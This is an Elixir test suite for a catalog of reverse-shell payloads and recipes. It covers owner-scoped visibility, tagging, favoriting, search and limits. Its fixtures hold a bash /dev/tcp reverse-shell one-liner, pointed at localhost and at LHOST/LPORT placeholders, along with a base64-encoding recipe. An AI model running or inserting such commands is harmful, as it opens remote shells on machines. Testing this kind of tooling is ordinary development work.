defmodule Revkit.CatalogTest do
  use Revkit.DataCase, async: false

  alias Revkit.Catalog
  alias Revkit.Catalog.{Payload, Recipe, Tag}
  alias Revkit.Limits

  @owner "owner-a"
  @other "owner-b"

  @payload_attrs %{
    name: "Bash TCP",
    template: "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
  }

  defp tag!(name) do
    {:ok, tag} = Catalog.create_tag(%{name: name})
    tag
  end

  describe "payloads" do
    test "create_payload/3 persists a private payload" do
      assert {:ok, %Payload{} = payload} = Catalog.create_payload(@owner, @payload_attrs)

      assert payload.name == "Bash TCP"
      assert payload.template == @payload_attrs.template
      assert payload.owner_id == @owner
      assert payload.source_payload_id == nil
    end

    test "create_payload/3 requires an owner" do
      assert {:error, :missing_owner} = Catalog.create_payload(nil, @payload_attrs)
    end

    test "create_payload/3 validates required fields" do
      assert {:error, changeset} = Catalog.create_payload(@owner, %{})
      assert %{name: ["can't be blank"], template: ["can't be blank"]} = errors_on(changeset)
    end

    test "list_payloads/1 returns public rows plus the owner's editions only" do
      {:ok, public} = Catalog.create_public_payload(%{name: "Public", template: "p"})
      {:ok, owned} = Catalog.create_payload(@owner, %{name: "Mine", template: "m"})
      {:ok, _other} = Catalog.create_payload(@other, %{name: "Other", template: "o"})

      visible = Catalog.list_payloads(@owner)
      assert Enum.map(visible, & &1.name) == ["Mine", "Public"]
      assert Enum.map(visible, & &1.id) |> Enum.sort() == Enum.sort([public.id, owned.id])
      assert Enum.map(Catalog.list_public_payloads(), & &1.name) == ["Public"]
      assert Enum.map(Catalog.list_owned_payloads(@owner), & &1.name) == ["Mine"]
    end

    test "get_payload/2 and get_payload!/2 enforce visibility" do
      {:ok, public} = Catalog.create_public_payload(%{name: "Public", template: "p"})
      {:ok, owned} = Catalog.create_payload(@owner, %{name: "Mine", template: "m"})
      {:ok, other} = Catalog.create_payload(@other, %{name: "Other", template: "o"})

      assert Catalog.get_payload(public.id, @owner).id == public.id
      assert Catalog.get_payload(owned.id, @owner).id == owned.id
      assert Catalog.get_payload(other.id, @owner) == nil
    end

    test "get_payload!/2 raises for invisible rows" do
      {:ok, other} = Catalog.create_payload(@other, %{name: "Other", template: "o"})

      assert_raise Ecto.NoResultsError, fn -> Catalog.get_payload!(other.id, @owner) end
      assert_raise Ecto.NoResultsError, fn -> Catalog.get_owned_payload!(other.id, @owner) end
    end

    test "update_payload/4 updates private rows only" do
      {:ok, public} = Catalog.create_public_payload(%{name: "Public", template: "p"})
      {:ok, payload} = Catalog.create_payload(@owner, @payload_attrs)

      assert {:ok, updated} = Catalog.update_payload(payload, @owner, %{name: "Renamed"})
      assert updated.name == "Renamed"

      assert {:error, :forbidden} = Catalog.update_payload(public, @owner, %{name: "Nope"})
      assert Catalog.get_payload!(public.id, @owner).name == "Public"
    end

    test "discard_payload/2 deletes only the owner's edition" do
      {:ok, public} = Catalog.create_public_payload(%{name: "Public", template: "p"})
      {:ok, payload} = Catalog.create_payload(@owner, @payload_attrs)

      assert {:ok, _payload} = Catalog.discard_payload(payload, @owner)
      assert Catalog.get_payload(payload.id, @owner) == nil
      assert Catalog.get_payload(public.id, @owner).id == public.id
      assert {:error, :forbidden} = Catalog.discard_payload(public, @owner)
    end

    test "improve_payload/2 creates one private copy and leaves the public row untouched" do
      {:ok, tag} = Catalog.create_tag(%{name: "linux"})
      {:ok, public} = Catalog.create_public_payload(@payload_attrs, [tag.id])

      assert {:ok, edition} = Catalog.improve_payload(public, @owner)
      assert edition.owner_id == @owner
      assert edition.source_payload_id == public.id
      assert edition.template == public.template
      assert Enum.map(edition.tags, & &1.id) == [tag.id]

      assert {:ok, same} = Catalog.improve_payload(public, @owner)
      assert same.id == edition.id
      assert length(Catalog.list_owned_payloads(@owner)) == 1

      assert Catalog.get_payload!(public.id, @owner).owner_id == nil
      assert Catalog.get_payload!(public.id, @owner).template == public.template

      assert {:ok, other} = Catalog.improve_payload(public, @other)
      assert other.id != edition.id
    end

    test "toggle_payload_favorite/2 only changes private editions" do
      {:ok, public} = Catalog.create_public_payload(@payload_attrs)
      {:ok, payload} = Catalog.create_payload(@owner, @payload_attrs)

      assert {:error, :forbidden} = Catalog.toggle_payload_favorite(public, @owner)

      assert {:ok, favorited} = Catalog.toggle_payload_favorite(payload, @owner)
      assert favorited.favorite == true
      assert {:ok, unfavorited} = Catalog.toggle_payload_favorite(favorited, @owner)
      assert unfavorited.favorite == false
    end

    test "put_payload_tags replaces tags and enforces the cap" do
      {:ok, payload} = Catalog.create_payload(@owner, @payload_attrs)
      linux = tag!("linux")
      bash = tag!("bash")
      web = tag!("web")
      ctf = tag!("ctf")

      assert {:ok, tagged} =
               Catalog.update_payload(payload, @owner, %{}, [linux.id, bash.id, web.id])

      assert tagged.tags |> Enum.map(& &1.name) |> Enum.sort() == ["bash", "linux", "web"]

      assert {:error, changeset} =
               Catalog.update_payload(tagged, @owner, %{}, [linux.id, bash.id, web.id, ctf.id])

      assert %{tags: [message]} = errors_on(changeset)
      assert message =~ "at most 3"
    end

    test "tag assignment rejects unknown tags and never creates them" do
      {:ok, payload} = Catalog.create_payload(@owner, @payload_attrs)

      assert {:error, changeset} =
               Catalog.update_payload(payload, @owner, %{}, [999_999])

      assert %{tags: ["must reference existing tags"]} = errors_on(changeset)
      assert Catalog.list_tags() == []
    end

    test "payloads reject references to another owner's recipe" do
      {:ok, other_recipe} = Catalog.create_recipe(@other, %{name: "Other recipe"})

      assert {:error, :unknown_recipe} =
               Catalog.create_payload(
                 @owner,
                 Map.put(@payload_attrs, :recipe_id, other_recipe.id)
               )
    end

    test "search_payloads/3 filters by owner, favorite, and tag" do
      {:ok, favorite} =
        Catalog.create_payload(
          @owner,
          Map.merge(@payload_attrs, %{name: "Favorite Linux", favorite: true})
        )

      {:ok, _other} = Catalog.create_payload(@other, %{name: "Other owner", template: "id"})
      {:ok, _public} = Catalog.create_public_payload(%{name: "Public", template: "id"})

      linux = tag!("linux")
      {:ok, _favorite} = Catalog.update_payload(favorite, @owner, %{}, [linux.id])

      assert Enum.map(Catalog.search_payloads(@owner, ""), & &1.name) ==
               ["Favorite Linux", "Public"]

      assert Enum.map(Catalog.search_payloads(@owner, "", favorite: true), & &1.name) ==
               ["Favorite Linux"]

      assert Enum.map(Catalog.search_payloads(@owner, "", tag_id: linux.id), & &1.name) ==
               ["Favorite Linux"]
    end

    test "search_payloads/3 matches name, description, template, and caps the query" do
      {:ok, _payload} =
        Catalog.create_public_payload(%{
          name: "Alpha shell",
          description: "interactive",
          template: "bash -i"
        })

      {:ok, _payload} =
        Catalog.create_public_payload(%{name: "Beta", description: "quiet", template: "nc"})

      assert Enum.map(Catalog.search_payloads(@owner, "alpha"), & &1.name) == ["Alpha shell"]

      assert Enum.map(Catalog.search_payloads(@owner, "interactive"), & &1.name) == [
               "Alpha shell"
             ]

      assert Enum.map(Catalog.search_payloads(@owner, "NC"), & &1.name) == ["Beta"]
      assert Catalog.search_payloads(@owner, "missing") == []
      assert Catalog.search_payloads(@owner, String.duplicate("a", 300)) == []
    end

    test "payload limits are enforced" do
      assert {:error, changeset} =
               Catalog.create_payload(
                 @owner,
                 Map.merge(@payload_attrs, %{name: String.duplicate("a", Limits.max_name() + 1)})
               )

      assert %{name: [message]} = errors_on(changeset)
      assert message =~ "at most"

      assert {:error, changeset} =
               Catalog.create_payload(@owner, %{
                 name: "Tools",
                 template: "id",
                 target_tools: Enum.map(1..(Limits.max_tools() + 1), &"tool#{&1}")
               })

      assert %{target_tools: [message]} = errors_on(changeset)
      assert message =~ "at most"
    end
  end

  describe "recipes" do
    test "create_recipe/3 normalizes and stores ordered steps" do
      attrs = %{
        name: "Wrap then encode",
        steps: [
          %{key: :bash_wrapper, options: %{}},
          %{"key" => "base64_encode", "options" => %{padding: true}}
        ]
      }

      assert {:ok, %Recipe{} = recipe} = Catalog.create_recipe(@owner, attrs)
      assert recipe.owner_id == @owner

      assert recipe.steps == [
               %{"key" => "bash_wrapper", "options" => %{}},
               %{"key" => "base64_encode", "options" => %{"padding" => true}}
             ]

      assert Catalog.get_recipe!(recipe.id, @owner).steps == recipe.steps
    end

    test "create_recipe/3 stores a full generation snapshot" do
      attrs = %{
        name: "Bash snapshot",
        template: "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1",
        variables: %{"LHOST" => "127.0.0.1", "LPORT" => "4444"},
        steps: [%{"key" => "base64_encode", "options" => %{}}],
        notes: "Requires bash",
        favorite: true,
        target_os: "linux",
        target_shell: "bash",
        target_tools: ["bash"]
      }

      assert {:ok, %Recipe{} = recipe} = Catalog.create_recipe(@owner, attrs)

      assert recipe.template == attrs.template
      assert recipe.variables == attrs.variables
      assert recipe.notes == "Requires bash"
      assert recipe.favorite == true
      assert recipe.target_os == "linux"
      assert recipe.target_shell == "bash"
      assert recipe.target_tools == ["bash"]

      loaded = Catalog.get_recipe!(recipe.id, @owner)
      assert loaded.template == attrs.template
      assert loaded.variables == attrs.variables
    end

    test "improve_recipe/2 copies the snapshot and tags" do
      {:ok, payload} = Catalog.create_public_payload(%{name: "Source", template: "id"})
      {:ok, tag} = Catalog.create_tag(%{name: "unix"})

      {:ok, recipe} =
        Catalog.create_public_recipe(
          %{
            name: "Original",
            template: "bash -i",
            variables: %{"LHOST" => "127.0.0.1"},
            steps: [%{"key" => "bash_wrapper", "options" => %{}}],
            notes: "note",
            target_os: "linux",
            target_shell: "bash",
            payload_id: payload.id
          },
          [tag.id]
        )

      assert {:ok, edition} = Catalog.improve_recipe(recipe, @owner)
      assert edition.owner_id == @owner
      assert edition.source_recipe_id == recipe.id
      assert edition.name == "Original"
      assert edition.template == "bash -i"
      assert edition.variables == %{"LHOST" => "127.0.0.1"}
      assert edition.steps == [%{"key" => "bash_wrapper", "options" => %{}}]
      assert edition.notes == "note"
      assert edition.target_shell == "bash"
      assert edition.payload_id == payload.id
      assert Enum.map(edition.tags, & &1.name) == ["unix"]

      assert {:ok, same} = Catalog.improve_recipe(recipe, @owner)
      assert same.id == edition.id
      assert Catalog.get_recipe!(recipe.id, @owner).owner_id == nil
    end

    test "search_recipes/3 matches snapshot fields and is owner-scoped" do
      {:ok, _recipe} =
        Catalog.create_public_recipe(%{
          name: "Linux shell",
          template: "bash -i",
          notes: "interactive"
        })

      {:ok, _recipe} = Catalog.create_recipe(@other, %{name: "Other owner", template: "cmd.exe"})
      {:ok, _recipe} = Catalog.create_public_recipe(%{name: "Other", template: "cmd.exe"})

      assert Enum.map(Catalog.search_recipes(@owner, "linux"), & &1.name) == ["Linux shell"]
      assert Enum.map(Catalog.search_recipes(@owner, "interactive"), & &1.name) == ["Linux shell"]
      assert Enum.map(Catalog.search_recipes(@owner, "CMD"), & &1.name) == ["Other"]
      refute Enum.any?(Catalog.search_recipes(@owner, ""), &(&1.name == "Other owner"))
    end

    test "toggle_recipe_favorite/2 only changes private editions" do
      {:ok, public} = Catalog.create_public_recipe(%{name: "Public"})
      {:ok, recipe} = Catalog.create_recipe(@owner, %{name: "Recipe"})

      assert {:error, :forbidden} = Catalog.toggle_recipe_favorite(public, @owner)
      assert {:ok, favorited} = Catalog.toggle_recipe_favorite(recipe, @owner)
      assert favorited.favorite == true
      assert {:ok, unfavorited} = Catalog.toggle_recipe_favorite(favorited, @owner)
      assert unfavorited.favorite == false
    end

    test "create_recipe/3 defaults steps to an empty list and rejects malformed steps" do
      assert {:ok, %Recipe{steps: []}} = Catalog.create_recipe(@owner, %{name: "Empty"})

      assert {:error, changeset} =
               Catalog.create_recipe(@owner, %{name: "Bad", steps: [%{"key" => ""}]})

      assert %{steps: [message]} = errors_on(changeset)
      assert message =~ "options map"
    end

    test "recipe limits reject too many steps and variables" do
      steps =
        Enum.map(1..(Limits.max_steps() + 1), fn _index ->
          %{"key" => "base64_encode", "options" => %{}}
        end)

      assert {:error, changeset} = Catalog.create_recipe(@owner, %{name: "Steps", steps: steps})
      assert %{steps: [message]} = errors_on(changeset)
      assert message =~ "at most"

      variables =
        Map.new(1..(Limits.max_variables() + 1), fn index -> {"V#{index}", "value"} end)

      assert {:error, changeset} =
               Catalog.create_recipe(@owner, %{name: "Vars", variables: variables})

      assert %{variables: [message]} = errors_on(changeset)
      assert message =~ "at most"
    end

    test "recipes reject references to another owner's payload" do
      {:ok, other_payload} = Catalog.create_payload(@other, %{name: "Other", template: "id"})

      assert {:error, :unknown_payload} =
               Catalog.create_recipe(@owner, %{name: "Recipe", payload_id: other_payload.id})
    end

    test "list_recipes/1 and list_recent_recipes/2 are owner-scoped" do
      {:ok, _public} = Catalog.create_public_recipe(%{name: "Public"})
      {:ok, _owned} = Catalog.create_recipe(@owner, %{name: "Mine"})
      {:ok, _other} = Catalog.create_recipe(@other, %{name: "Other"})

      assert Enum.map(Catalog.list_recipes(@owner), & &1.name) == ["Mine", "Public"]
      assert Enum.map(Catalog.list_public_recipes(), & &1.name) == ["Public"]
      assert Enum.map(Catalog.list_owned_recipes(@owner), & &1.name) == ["Mine"]
      assert Enum.map(Catalog.list_recent_recipes(@owner), & &1.name) == ["Mine", "Public"]
    end

    test "update_recipe/4 and discard_recipe/2 are owner-only" do
      {:ok, public} = Catalog.create_public_recipe(%{name: "Public"})
      {:ok, recipe} = Catalog.create_recipe(@owner, %{name: "Original"})

      assert {:ok, updated} = Catalog.update_recipe(recipe, @owner, %{name: "Renamed"})
      assert updated.name == "Renamed"
      assert {:error, :forbidden} = Catalog.update_recipe(public, @owner, %{name: "Nope"})

      assert {:ok, _recipe} = Catalog.discard_recipe(updated, @owner)
      assert Catalog.get_recipe(recipe.id, @owner) == nil
      assert {:error, :forbidden} = Catalog.discard_recipe(public, @owner)
    end
  end

  describe "tags" do
    test "create_tag/1 trims whitespace and enforces unique names" do
      assert {:ok, %Tag{name: "unix"}} = Catalog.create_tag(%{name: "  unix  "})
      assert {:error, changeset} = Catalog.create_tag(%{name: "unix"})
      assert %{name: ["has already been taken"]} = errors_on(changeset)
    end

    test "create_tag/1 validates the name" do
      assert {:error, changeset} = Catalog.create_tag(%{name: "   "})
      assert %{name: ["can't be blank"]} = errors_on(changeset)
    end

    test "list_tags/0 orders by name" do
      tag!("zeta")
      tag!("alpha")

      assert Enum.map(Catalog.list_tags(), & &1.name) == ["alpha", "zeta"]
    end

    test "the vocabulary is capped" do
      Enum.each(1..Limits.max_tag_vocabulary(), fn index -> tag!("tag-#{index}") end)

      assert {:error, :vocabulary_full} = Catalog.create_tag(%{name: "one-more"})
    end

    test "ensure_tags creates missing names and reuses existing ones" do
      assert {:ok, tags} = Catalog.ensure_tags(["linux", "bash", "linux"])
      assert Enum.map(tags, & &1.name) == ["linux", "bash"]

      assert {:ok, again} = Catalog.ensure_tags(["linux"])
      assert Enum.map(again, & &1.name) == ["linux"]
      assert length(Catalog.list_tags()) == 2
    end

    test "list_tags_with_usage/1 counts only visible rows" do
      {:ok, tag} = Catalog.create_tag(%{name: "linux"})
      {:ok, payload} = Catalog.create_public_payload(@payload_attrs, [tag.id])
      {:ok, _recipe} = Catalog.create_public_recipe(%{name: "Recipe"}, [tag.id])
      {:ok, _hidden} = Catalog.create_payload(@other, @payload_attrs, [tag.id])

      assert [%{tag: %{name: "linux"}, payloads: 1, recipes: 1}] =
               Catalog.list_tags_with_usage(@owner)

      assert Catalog.get_payload!(payload.id, @owner).id == payload.id
    end
  end
end
